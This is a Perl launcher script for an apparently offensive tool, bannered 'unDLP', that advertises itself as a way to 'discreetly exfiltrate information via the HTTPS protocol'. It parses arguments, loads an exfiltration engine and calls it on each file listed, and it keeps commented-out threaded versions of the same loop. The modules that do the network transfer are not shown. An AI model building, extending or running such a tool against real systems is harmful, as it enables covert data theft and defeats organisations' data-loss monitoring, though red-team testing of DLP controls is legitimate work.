#!/usr/bin/perl

use Parallel::ForkManager;
use strict;
# use threads;
# use Thread::Queue;
use warnings;

require Entity::ModuleFactory;
require Entity::Parser;

print "
             ________  .____   __________
 __ __  ____ \\______ \\ |    |  \\______   \\
|  |  \\/    \\ |    |  \\|    |   |     ___/
|  |  /   |  \\|    `   \\    |___|    |
|____/|___|  /_______  /_______ \\____|
           \\/        \\/        \\/

Discreetly exfiltrate information via the HTTPS protocol.

Fell free to contact the maintainer for any further questions or improvement vectors.
Maintained by Nitrax <nitrax\@lokisec.fr>

";

my $parser = Parser->new();

$parser->parse(@ARGV);

my $pm = new Parallel::ForkManager(30);
my $engine =  ModuleFactory->new()->create($parser);

foreach my $file ($parser->getFiles) {
    $engine->exfiltrate($file);
}

# my $q = Thread::Queue->new();
#
# $q->enqueue($_) for $parser->getFiles;
#
# my @thr = map {
#     threads->create(sub {
#         while (defined(my $file = $q->dequeue_nb())) {
#             my $engine = ModuleFactory->new()->create($parser);
#
#             $engine->exfiltrate($file)
#         }
#     });
# }1..scalar $parser->getFiles;
#
# $_->join() for @thr;

# foreach my $file ($parser->getFiles) {
#     # my $thr = threads->create(sub {
#     #     $engine->exfiltrate($file)
#     # });
#     #
#     # $thr->join();
#     my $thr = async { $engine->exfiltrate($file) };
#     $thr->join();
# }
